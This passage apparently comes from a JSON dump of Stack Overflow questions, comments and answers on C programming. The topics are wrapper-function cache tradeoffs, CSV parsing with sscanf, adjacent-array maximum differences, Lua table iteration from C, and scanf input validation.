1499262514, "creation_date": 1499248112, "last_edit_date": 1499262514, "question_id": 44922687, "link": "https://stackoverflow.com/questions/44922687/when-should-we-care-about-cache-missing", "title": "when should we care about cache missing?", "body": "<p>I want to explain my question through a practical problem I met in my project.</p>\n\n<p>I am writing a c library( which behaves like a programmable <code>vi editor</code>), and i plan to provide a series of APIs ( more than 20 in total ):</p>\n\n<pre><code>void vi_dw(struct vi *vi);\nvoid vi_de(struct vi *vi);\nvoid vi_d0(struct vi *vi);\nvoid vi_d$(struct vi *vi);\n...\nvoid vi_df(struct vi *, char target);\nvoid vi_dd(struct vi *vi);\n</code></pre>\n\n<p>These APIs do not perform core operations, they are just wrappers. For example, I can implement <code>vi_de()</code> like this:</p>\n\n<pre><code>void vi_de(struct vi *vi){\n    vi_v(vi);  //enter visual mode\n    vi_e(vi);  //press key 'e'\n    vi_d(vi);  //press key 'd'\n}\n</code></pre>\n\n<p>However, if the wrapper is as simple as such, I have to write more than 20 similar wrapper functions.<br/>\nSo, I consider implementing  more complex wrappers to reduce the amount: <br/></p>\n\n<pre><code>void vi_d_move(struct vi *vi, vi_move_func_t move){\n   vi_v(vi);\n   move(vi);\n   vi_d(vi);\n}\nstatic inline void vi_dw(struct vi *vi){\n    vi_d_move(vi, vi_w);\n}\nstatic inline void vi_de(struct vi *vi){\n    vi_d_move(vi, vi_e);\n}\n...\n</code></pre>\n\n<p>The function <code>vi_d_move()</code> is a better wrapper function, he can convert a part of similar move operation to APIs, but not all, like <code>vi_f()</code>, which need another wrapper with a third argument <code>char target</code> .<br/></p>\n\n<p>I finished explaining the example picked from my project. <br/>The pseudo code above is simper than real case, but is enough to show that:<br/>\nThe more complex the wrapper is, the less wrappers we need, and the slower they will be.(they will become more indirect or need to consider more conditions).</p>\n\n<p>There are two extremes:</p>\n\n<ol>\n<li><p>use only one wrapper but complex enough to adopt all move operations and convert them into corresponding APIs.</p></li>\n<li><p>use more than twenty small and simple wrappers. one wrapper is one API.</p></li>\n</ol>\n\n<p>For case 1, the wrapper itself is slow, but it has more chance resident in cache, because it is often executed(all APIs share it). It's a slow but hot path.</p>\n\n<p>For case 2, these wrappers are simple and fast, but has less chance resident in cache. At least, for any API first time called, a cache miss will happen.(CPU need to fetch instructions from memory, but not L1, L2).</p>\n\n<p>Currently, I implemented five wrappers, each of them are relatively simple and fast.  this seems to be a balance, but just seems. I chose five just because I felt the move operation can be divided into five groups naturally. I have no idea how to evaluate it, I don't mean a profiler, I mean, in theory, what main factors should be considered in such case?</p>\n\n<p>In the post end, I want to add more detail for these APIs:</p>\n\n<ol>\n<li><p>These APIs need to be fast. Because this library is designed as a high performance virtual editor. The delete/copy/paste operation is designed to approach the bare C code.</p></li>\n<li><p>A user program based on this library seldom calls all these APIs, only parts of them, and usually no more than 10 times for each.</p></li>\n<li><p>In real case, the size of these simple wrappers are about 80 bytes each, and will be no more than 160 bytes even merged into a single complex one. (but will introduce more if-else branches). </p></li>\n</ol>\n\n<p>4, As with the situation the library is used, I will take <code>lua-shell</code> as example(a little off-topic, but some friends want to know why I so care its performance):</p>\n\n<p><code>lua-shell</code> is a *nix shell which uses <code>lua</code> as its script. Its command execution unit(which do forks(), execute()..) is just a C module registered into the lua state machine. </p>\n\n<p><code>Lua-shell</code> treats everything  as <code>lua</code> .</p>\n\n<p>So, When user input:<br/></p>\n\n<pre><code>local files = `ls -la`\n</code></pre>\n\n<p>And press <code>Enter</code>. The  string input is first sent to lua-shell's preprocessor\u2014\u2014\u2014\u2014which convert mixed-syntax to pure lua code:</p>\n\n<pre><code>local file = run_command(\"ls -la\")\n</code></pre>\n\n<p><code>run_command()</code> is  the entry of lua-shell's command execution unit, which, I said before, is a C module. </p>\n\n<p>We can talk about <code>libvi</code> now. lua-shell's preprocessor is the first user of the library I am writing. Here is its relative codes(pseudo):</p>\n\n<pre><code>#include\"vi.h\"\nvi_loadstr(\"local files = `ls -la`\");\nvi_f(vi, '`');\nvi_x(vi);\nvi_i(vi, \"run_command(\\\"\");\nvi_f(vi, '`');\nvi_x(vi);\nvi_a(\" \\\") \");\n</code></pre>\n\n<p>The code above is parts of luashell's preprocessor implementation.\nAfter generating the pure lua code, he feeds it to Lua State Machine and run it.</p>\n\n<p>The shell user is sensitive to the time interval between <code>Enter</code> and a new prompt, and in most case lua-shell needs preprocess script with  larger size and more complicate mixed-syntax. </p>\n\n<p>This is a typical situation where <code>libvi</code> is used.</p>\n"}, {"tags": ["c", "csv", "struct"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 3, "creation_date": 1499247176, "post_id": 44922214, "comment_id": 76820262, "body": "What is <code>places</code>? Is it an array? Of structures? What is the definition of the structures? Please try to create a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, <b>Complete</b>, and Verifiable Example</a> to show us."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1499247328, "post_id": 44922214, "comment_id": 76820368, "body": "Also, reading and parsing of a CSV file is <b><i>deceptively</i></b> simple. In reality it&#39;s much harder than it seems, which is why I always recommend people asking questions about parsing such files to try and find a library to handle it for them."}, {"owner": {"reputation": 6013, "user_id": 3310281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9b8b4ec03e2c7a424fdc428eb55f2e8?s=128&d=identicon&r=PG&f=1", "display_name": "Malcolm McLean", "link": "https://stackoverflow.com/users/3310281/malcolm-mclean"}, "edited": false, "score": 0, "creation_date": 1499247572, "post_id": 44922214, "comment_id": 76820538, "body": "To debug, print out the lines you are reading with fgets() and verify that you are passing over the whole file. Then check the return from sscanf() (not scanf). The check you are reading the fields into temporaries correctly. Then check you are assigning the fields to your in-memory structure."}, {"owner": {"reputation": 834, "user_id": 3169277, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/bb1594eb0c9b20a84b5ad02665c705b0?s=128&d=identicon&r=PG&f=1", "display_name": "Tom Goodfellow", "link": "https://stackoverflow.com/users/3169277/tom-goodfellow"}, "edited": false, "score": 3, "creation_date": 1499247586, "post_id": 44922214, "comment_id": 76820550, "body": "Uninitialised &quot;i&quot; ?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1499248418, "post_id": 44922214, "comment_id": 76821191, "body": "Your comment on <code>while((fgets(...)) !=NULL) &#47;&#47;while the line isn&#39;t blank</code> is not true: a blank line will be read as a string consisting of a newline and a nul terminator. The <code>NULL</code> is returned when end of file has been reached."}, {"owner": {"reputation": 32303, "user_id": 4386427, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d2d2716ce8bcf5967e7b3c00bd0095b5?s=128&d=identicon&r=PG&f=1", "display_name": "4386427", "link": "https://stackoverflow.com/users/4386427/4386427"}, "edited": false, "score": 0, "creation_date": 1499249160, "post_id": 44922214, "comment_id": 76821767, "body": "The missing initialization of variable <code>i</code> already mentioned is a major problem. Another major problem is the use of <code>scanf</code>. You probably wanted to use <code>sscanf</code>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1499250461, "post_id": 44922214, "comment_id": 76822711, "body": "The formatting width of <code>23</code> is too small to tabulate <code>Toyoda Auditorium &#47; Symposion</code> nicely."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499251931, "post_id": 44922214, "comment_id": 76823767, "body": "While the uninitialized variable <code>i</code> is a big problem, I&#39;m more worried about the structure members <code>name</code> and <code>category</code>. If they are <i>pointers</i> instead of arrays then that is a worse problems than <code>i</code> being uninitialized."}, {"owner": {"reputation": 1, "user_id": 7606821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/314c6c6c922878aff35240e51eb71d2f?s=128&d=identicon&r=PG&f=1", "display_name": "Laurel", "link": "https://stackoverflow.com/users/7606821/laurel"}, "edited": false, "score": 0, "creation_date": 1499339837, "post_id": 44922214, "comment_id": 76869707, "body": "I didn&#39;t include the whole code since it is huge, but places is an array of structures- name and category are both arrays, and the x and y are ints.  Unfortunately using a library to parse the file is not allowed, so I am stuck trying to do it without.  Thanks for catching that &#39;i&#39; though, originally it was being used in a for loop and I forgot to initialize it after I removed the loop."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7606821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/314c6c6c922878aff35240e51eb71d2f?s=128&d=identicon&r=PG&f=1", "display_name": "Laurel", "link": "https://stackoverflow.com/users/7606821/laurel"}, "edited": false, "score": 0, "creation_date": 1499340769, "post_id": 44923538, "comment_id": 76870332, "body": "Thank you! that &#39;%[^,]&#39; instead of &#39;%s&#39; worked great."}], "tags": [], "owner": {"reputation": 398, "user_id": 5871187, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hu64h.jpg?s=128&g=1", "display_name": "S Dao", "link": "https://stackoverflow.com/users/5871187/s-dao"}, "is_accepted": false, "score": 1, "last_activity_date": 1499250148, "creation_date": 1499250148, "answer_id": 44923538, "question_id": 44922214, "link": "https://stackoverflow.com/questions/44922214/issues-with-reading-data-from-csv/44923538#44923538", "title": "issues with reading data from csv", "body": "<p>Try <code>fscanf</code> to read from file instead of <code>scanf</code> and also use <code>%[^,]</code>(read all except ',') instead of <code>%s</code>.</p>\n\n<p>Codesnip: <code>while(fscanf(file, \"%[^,],%[^,],%d,%d\", &amp;places[i].name, &amp;places[i].category, &amp;places[i].x, &amp;places[i].y) == 4)</code></p>\n"}], "owner": {"reputation": 1, "user_id": 7606821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/314c6c6c922878aff35240e51eb71d2f?s=128&d=identicon&r=PG&f=1", "display_name": "Laurel", "link": "https://stackoverflow.com/users/7606821/laurel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1511464732, "creation_date": 1499246857, "question_id": 44922214, "link": "https://stackoverflow.com/questions/44922214/issues-with-reading-data-from-csv", "title": "issues with reading data from csv", "body": "<p>I am working on a code in c that needs to read csv data and enter it into a structure.  Admittedly I both am more familiar with c++ and haven't done much with reading from files before so I could be missing something really obvious.  But when I check the structure array after it supposedly loaded the data, I get the right number of lines but all but the second one are blank- and that one for some reason just has a smiley face...</p>\n\n<p>Here is my code:</p>\n\n<pre><code>void load_items(){\nchar file_name[20], buffer[MAX_LINE_LENGTH];\nFILE *file;\nint i;\n\nprintf(\"Enter the file to load data from: \");       //data.csv for here\nscanf(\"%s\", file_name);\n\nfile=fopen(file_name,\"r\");\n\nif(file==NULL)\n{\n    printf(\"Can't open %s\\n\",file_name);\n    //exit(EXIT_FAILURE);\n}\nelse {\n    printf(\"Congrats! you opened %s as your data source!\\n\", file_name);        //test to make sure opened file\n    while((fgets(buffer, sizeof(buffer),file)) !=NULL)          //while the line isn't blank\n    {\n        scanf(buffer,\"%s,%s,%d,%d\",&amp;places[i].name,&amp;places[i].category,&amp;places[i].x,&amp;places[i].y);      //enter data into proper place\n        printf(\"|%-23s|%-20s\\t| ( %d, %d) |\\n\",places[i].name, places[i].category, places[i].x,places[i].y);    //test to see data\n        i++;\n    }\n}\nfclose(file);\n}\n</code></pre>\n\n<p>Here is what the info it is reading from looks like:</p>\n\n<pre><code>STARBUCKS COFFEE,cafeteria,7,11\nRestaurant UNIVERSAL CLUB,cafeteria,18,16\nPHONON CAFE ROOM,cafeteria,7,12\nCraig's Cafe SEATTLE ESPRESS,cafeteria,18,11\nCafeteria NANAMI-TEI,cafeteria,11,7\nIB Cafe,cafeteria,11,9\nRestaurant Chez Jiroud,cafeteria,15,10\nLabo Shop (NU CO-OP Shop),shop,29,19\nNU CO-OP North,shop,11,5\nFamily Mart,shop,13,11\nSouth Cafeteria,cafeteria,4,17\nNU CO-OP South,shop,5,17\nAmenity House,shop,6,17\nFOREST Books &amp; Cafe,cafeteria,19,7\nGreen Salon Higashiyama,cafeteria,21,8\nToyoda Auditorium / Symposion,Convention facility,17,15\nNoyori Conference Hall,Convention facility,21,14\nE &amp; S Hall,Convention facility,16,9\nSakata &amp; Hirata Hall,Convention facility,19,11\n</code></pre>\n\n<p>And here is what I am actually getting:</p>\n\n<pre><code>|                       |                       | ( 0, 0) |\n|\u263a                      |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n|                       |                       | ( 0, 0) |\n</code></pre>\n\n<p>If it wasn't for that weird smiley I would think it just wasn't reading anything, or not transfering it into the struct right, but as it is I am baffeled.  Any advice would be very welcome, thank you for your time!</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1499247020, "post_id": 44922135, "comment_id": 76820141, "body": "This looks more like <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">a job for the rubber duck</a> ... you&#39;ll do yourself a favor learning to debug things like this."}, {"owner": {"reputation": 2945, "user_id": 1376444, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/6fTWs.jpg?s=128&g=1", "display_name": "Brian Brown", "link": "https://stackoverflow.com/users/1376444/brian-brown"}, "edited": false, "score": 0, "creation_date": 1499247026, "post_id": 44922135, "comment_id": 76820146, "body": "@George: but when I changed <code>6</code> to <code>26</code>, it still prints <code>6</code> instead of, in this case, <code>21</code>."}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1499247030, "post_id": 44922135, "comment_id": 76820148, "body": "Use your debugger."}, {"owner": {"reputation": 1273, "user_id": 326832, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e94827dead904c31e7103f0989b2896c?s=128&d=identicon&r=PG", "display_name": "Achilles", "link": "https://stackoverflow.com/users/326832/achilles"}, "edited": false, "score": 4, "creation_date": 1499247117, "post_id": 44922135, "comment_id": 76820214, "body": "That&#39;s cuz you are printing <code>diff</code>not <code>maxdiff</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499264485, "post_id": 44922135, "comment_id": 76833260, "body": "This task would be more interesting if  code needed to cope with <code>int</code> values over the entire range of <code>int</code> as <code>tab[i] - tab[i-1]</code> can overflow.  Of course one may use a wider integer, yet what if the task was <code>intmax_t tab[6]</code>?  Hmmm."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 2, "creation_date": 1499247258, "post_id": 44922332, "comment_id": 76820322, "body": "also note the only <i>somewhat subtle</i> bug: what if you switch places for <code>2</code> and <code>8</code>?"}], "tags": [], "owner": {"reputation": 2055, "user_id": 6564148, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/u3HL5.png?s=128&g=1", "display_name": "George", "link": "https://stackoverflow.com/users/6564148/george"}, "is_accepted": false, "score": 2, "last_activity_date": 1499501933, "last_edit_date": 1499501933, "creation_date": 1499247156, "answer_id": 44922332, "question_id": 44922135, "link": "https://stackoverflow.com/questions/44922135/max-difference-between-two-adjacent-values-in-an-array-c/44922332#44922332", "title": "Max difference between two adjacent values in an array, C", "body": "<ul>\n<li><code>i&lt;n-1</code> will not test the difference between the final two values of <code>tab</code>\nand should be <code>i&lt;n</code>.</li>\n<li>The if should be below the difference calculation to catch if the final difference calculated is the largest.</li>\n<li>You should be printing the <code>maxdiff</code></li>\n<li>You should also be taking the absolute value in your difference calculation, to account for the first number being larger than the second (As pointed out by @Felix Palmen). You can use the <code>abs</code> function defined in <code>stdlib.h</code> or write it yourself <code>diff &gt; 0? diff : -diff</code>.</li>\n</ul>\n\n<p>Fixed code:</p>\n\n<pre><code>int main(int argc, char **argv)\n{\n    int n = 6;\n    int tab[6] = {1,2,8,4,5,6};\n    int diff = abs(tab[1] - tab[0]), maxdiff = diff, i;\n\n    for(i=2; i&lt;n; i++)\n    {\n        diff = abs(tab[i] - tab[i-1]);\n\n        if(diff &gt; maxdiff)\n            maxdiff = diff;\n    }\n\n    printf(\"Max difference: %d\\n\", maxdiff);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 6751, "user_id": 1417063, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Mwy5e.jpg?s=128&g=1", "display_name": "Davide Spataro", "link": "https://stackoverflow.com/users/1417063/davide-spataro"}, "is_accepted": true, "score": 5, "last_activity_date": 1499288080, "last_edit_date": 1499288080, "creation_date": 1499247335, "answer_id": 44922393, "question_id": 44922135, "link": "https://stackoverflow.com/questions/44922135/max-difference-between-two-adjacent-values-in-an-array-c/44922393#44922393", "title": "Max difference between two adjacent values in an array, C", "body": "<p>Well, you keep the information about the maximum difference into <code>maxdiff</code> but you always print <code>diff</code> which is the difference between the one before the last pair of numbers (in this example <code>1</code>).</p>\n\n<p><code>i</code> should goes up to <code>&lt; n</code> otherwise you don't take into account the last pair.</p>\n\n<ul>\n<li>I would clean up the code a bit and check for the <code>n&lt;=1</code> corner case.</li>\n<li>I guess that you are interested in the <strong>absolute difference</strong> among values. You either use <code>abs</code> or make sure the subtraction gives you a non-negative result by changing the order of the operands accordingly. (<code>abs</code> is easier)</li>\n</ul>\n\n<p>Here it is  my suggestion: </p>\n\n<pre><code>int main(int argc, char **argv) {\n  const int n = 6;\n  int tab[n] = {1, 2, 8, 4, 5, 26};\n  if (n &lt;= 1)\n    return 0; //or whatever you have to do in this corner case\n  else {\n    int maxdiff = INT_MIN;\n    for (int i = 1; i &lt; n; i++)\n      maxdiff = max(maxdiff, abs(tab[i] - tab[i - 1]));\n\n    printf(\"%d\\n\", maxdiff);\n  }\n  return 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 126343, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 1, "last_activity_date": 1499247385, "creation_date": 1499247385, "answer_id": 44922412, "question_id": 44922135, "link": "https://stackoverflow.com/questions/44922135/max-difference-between-two-adjacent-values-in-an-array-c/44922412#44922412", "title": "Max difference between two adjacent values in an array, C", "body": "<p>There's two problems. First, you're printing <code>diff</code> instead of <code>maxdiff</code>. So you're getting the result of the last diff, not the max.</p>\n\n<p>Second, you're not taking the absolute value. That means <code>{8,2,4}</code> would result in 2, not 6.</p>\n\n<p>Finally, though this isn't a bug, a bunch of duplication can be removed by starting with <code>maxdiff = 0</code>.</p>\n\n<p>And a style note: declaring multiple variables on one line is hard to read. Declaring <em>and initializing</em> them on one line is very hard to read. Don't do it.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    int n = 6;\n    int tab[] = {1,2,8,4,5,6};\n    int maxdiff = 0;\n\n    for(int i=1; i &lt; n; i++) {\n        int diff = abs(tab[i] - tab[i-1]);\n        if(diff &gt; maxdiff) {\n            maxdiff = diff;\n        }\n    }\n\n    printf(\"%d\\n\", maxdiff);\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 2945, "user_id": 1376444, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/6fTWs.jpg?s=128&g=1", "display_name": "Brian Brown", "link": "https://stackoverflow.com/users/1376444/brian-brown"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2750, "favorite_count": 0, "accepted_answer_id": 44922393, "answer_count": 3, "score": -2, "last_activity_date": 1499501933, "creation_date": 1499246675, "question_id": 44922135, "link": "https://stackoverflow.com/questions/44922135/max-difference-between-two-adjacent-values-in-an-array-c", "title": "Max difference between two adjacent values in an array, C", "body": "<p>I want to find the max difference between two adjacent values in an array.For instance, for array <code>int tab[6] = {1,2,8,4,5,6};</code> the maximum difference is <code>6</code>, because of the difference between <code>8</code> and <code>2</code>. Remaining differences are equal to <code>1</code>. So, the result of my program should be <code>6</code>. However, my program prints <code>1</code> and I do not know where's the problem:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, char **argv)\n{\n    int n = 6;\n    int tab[6] = {1,2,8,4,5,6};\n    int diff = tab[1] - tab[0], maxdiff = diff, i;\n\n    for(i=2; i&lt;n-1; i++)\n    {\n        if(diff &gt; maxdiff)\n            maxdiff = diff;\n\n        diff = tab[i] - tab[i-1];\n    }\n\n    printf(\"%d\\n\", diff);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "loops", "multidimensional-array", "lua", "lua-table"], "answers": [{"tags": [], "owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "is_accepted": true, "score": 4, "last_activity_date": 1499244542, "creation_date": 1499244542, "answer_id": 44921312, "question_id": 44920971, "link": "https://stackoverflow.com/questions/44920971/iterating-a-multidimensional-lua-table-in-c/44921312#44921312", "title": "Iterating a multidimensional Lua Table in C", "body": "<p>The <code>lua_pop(L, 1)</code> from the second dimension is outside your iteration!</p>\n\n<pre><code>  while (lua_next(L, -2) != 0) /* table is in the stack at index -2 */\n  {\n     printf(\"%s - %s\\n\",\n            lua_typename(L, lua_type(L, -2)),\n            lua_typename(L, lua_type(L, -1)));\n  }\n  /* removes 'value'; keeps 'key' for next iteration */\n  lua_pop(L, 1);\n</code></pre>\n\n<p>You need to put it inside the while-loop to get it working to have the value removed, which <code>lua_next()</code> in your while-condition implicitly puts on the stack.</p>\n\n<pre><code>  while (lua_next(L, -2) != 0) /* table is in the stack at index -2 */\n  {\n     printf(\"%s - %s\\n\",\n            lua_typename(L, lua_type(L, -2)),\n            lua_typename(L, lua_type(L, -1)));\n     /* removes 'value'; keeps 'key' for next iteration */\n     lua_pop(L, 1);\n  }\n</code></pre>\n\n<p>This way it should work as expected.</p>\n"}], "owner": {"reputation": 51, "user_id": 8248785, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PTPqW.jpg?s=128&g=1", "display_name": "Gregor Wei&#223;enborn", "link": "https://stackoverflow.com/users/8248785/gregor-wei%c3%9fenborn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 486, "favorite_count": 1, "accepted_answer_id": 44921312, "answer_count": 1, "score": 4, "last_activity_date": 1499248848, "creation_date": 1499243687, "last_edit_date": 1499244971, "question_id": 44920971, "link": "https://stackoverflow.com/questions/44920971/iterating-a-multidimensional-lua-table-in-c", "title": "Iterating a multidimensional Lua Table in C", "body": "<p>I have a problem iterating a multidimensional Lua table in C. </p>\n\n<p>Let the Lua table be this i.e.:</p>\n\n<pre><code>local MyLuaTable = {\n  {0x04, 0x0001, 0x0001, 0x84, 0x000000},\n  {0x04, 0x0001, 0x0001, 0x84, 0x000010}\n}\n</code></pre>\n\n<p>I tried to extend the C sample code:</p>\n\n<pre><code> /* table is in the stack at index 't' */\n lua_pushnil(L);  /* first key */\n while (lua_next(L, t) != 0) {\n   /* uses 'key' (at index -2) and 'value' (at index -1) */\n   printf(\"%s - %s\\n\",\n          lua_typename(L, lua_type(L, -2)),\n          lua_typename(L, lua_type(L, -1)));\n   /* removes 'value'; keeps 'key' for next iteration */\n   lua_pop(L, 1);\n }\n</code></pre>\n\n<p>by the second dimension:</p>\n\n<pre><code>/* table is in the stack at index 't' */\nlua_pushnil(L);  /* first key */ /* Iterating the first dimension */\nwhile (lua_next(L, t) != 0)  \n{\n   /* uses 'key' (at index -2) and 'value' (at index -1) */\n   printf(\"%s - %s\\n\",\n          lua_typename(L, lua_type(L, -2)),\n          lua_typename(L, lua_type(L, -1)));\n\n   if(lua_istable(L, -1))\n   {\n      lua_pushnil(L);  /* first key */ /* Iterating the second dimension */\n      while (lua_next(L, -2) != 0) /* table is in the stack at index -2 */\n      {\n         printf(\"%s - %s\\n\",\n                lua_typename(L, lua_type(L, -2)),\n                lua_typename(L, lua_type(L, -1)));\n      }\n      /* removes 'value'; keeps 'key' for next iteration */\n      lua_pop(L, 1);\n   }\n   /* removes 'value'; keeps 'key' for next iteration */\n   lua_pop(L, 1);\n}\n</code></pre>\n\n<p>The output is:</p>\n\n<p>\"<strong>number - table</strong>\" (from the first dimension)</p>\n\n<p>\"<strong>number - number</strong>\" (from the second dimension)</p>\n\n<p>\"<strong>number - thread</strong>\" (from the second dimension)</p>\n\n<p>Afterwards my code crashes in the \"while (lua_next(L, -2) != 0)\"</p>\n\n<p>Has anybody an idea how to correctly iterate the two dimensional Lua table?</p>\n"}, {"tags": ["c", "file", "scanf", "strcmp"], "answers": [{"tags": [], "owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "is_accepted": false, "score": 0, "last_activity_date": 1499244382, "creation_date": 1499244382, "answer_id": 44921247, "question_id": 44920681, "link": "https://stackoverflow.com/questions/44920681/how-to-use-fscanf-to-read-from-file-and-find-the-matched-record-with-the-user-in/44921247#44921247", "title": "How to use fscanf to read from file and find the matched record with the user input", "body": "<p>You have one error in the initial format string, and you do not test the return value of the <code>scanf</code> calls, so the all return errors but you are not warned about it.</p>\n\n<pre><code>            printf(\"Enter your name\\n\");\n            if (1 != scanf(\" %[^\\n]\",name)) {  // no s after [] format\n                fprintf(stderr, \"Error reading name\\n\");\n                return 1;\n            }\n            printf(\"Enter you birthday(dd/mm/yyyy)\\n\");\n            if (3 != scanf(\"%d%*[-/]%d%*[-/]%d\",&amp;day,&amp;month,&amp;year)) {\n                ...\n            }\n            printf(\"Enter your contact number (60-)\\n\");\n            if (1 != scanf(\"%d\",&amp;contactNumber)) {\n                ...\n            }\n            printf(\"Enter your postcode\\n\");\n            if (1 != scanf(\"%d\",&amp;postcode)) {\n                ...\n            }\n</code></pre>\n\n<p>Remember: <strong>Always test input functions</strong></p>\n"}], "owner": {"reputation": 1, "user_id": 8257733, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c713e0c2144c22fb7d374891ec167408?s=128&d=identicon&r=PG&f=1", "display_name": "Edward", "link": "https://stackoverflow.com/users/8257733/edward"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 222, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1499244382, "creation_date": 1499242829, "question_id": 44920681, "link": "https://stackoverflow.com/questions/44920681/how-to-use-fscanf-to-read-from-file-and-find-the-matched-record-with-the-user-in", "title": "How to use fscanf to read from file and find the matched record with the user input", "body": "<p>I want to read the user input and verify if it is match with the \"user.txt\" record, if it match then it will prompt the user an error message,but the data read by the scanf will always turn into random number,here's the code.Sorry for my English as i'm not a native English speaker                    </p>\n\n<pre><code>                int day,month,year;\n                char name[15];\n\n\n                printf(\"Enter your name\\n\");\n                scanf(\" %[^\\n]s\",name);\n                printf(\"Enter you birthday(dd/mm/yyyy)\\n\");\n                scanf(\"%d%*[-/]%d%*[-/]%d\",&amp;day,&amp;month,&amp;year);\n                printf(\"Enter your contact number (60-)\\n\");\n                scanf(\"%d\",&amp;contactNumber);\n                printf(\"Enter your postcode\\n\");\n                scanf(\"%d\",&amp;postcode);\n\n                char x [30];\n                int y,z,w,d;\n                int duplicateContactNum [15];\n                int checkSentinel=0;\n\n                filepointer=fopen(\"user.txt\",\"r\");\n                if(filepointer==NULL){\n                //Not exist,Print exception message\n                printf(\"Exception Occur: Error writing text into the text file\");\n\n                }\n                while(!feof(filepointer))\n                {\n                    